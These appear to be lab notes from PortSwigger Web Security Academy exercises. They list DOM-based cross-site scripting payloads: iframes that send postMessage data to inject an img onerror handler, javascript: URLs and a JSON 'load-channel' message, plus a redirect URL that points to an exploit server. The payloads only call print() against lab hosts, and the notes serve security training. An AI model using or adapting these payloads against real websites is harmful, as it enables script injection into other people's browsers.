____

addEventListener

```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

```js
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

location.href

```url
https://0a5e00280463808e835e193500ba0092.web-security-academy.net/post?postId=4&url=https://exploit-0abb00a704e48054836518f201070024.exploit-server.net/exploit
```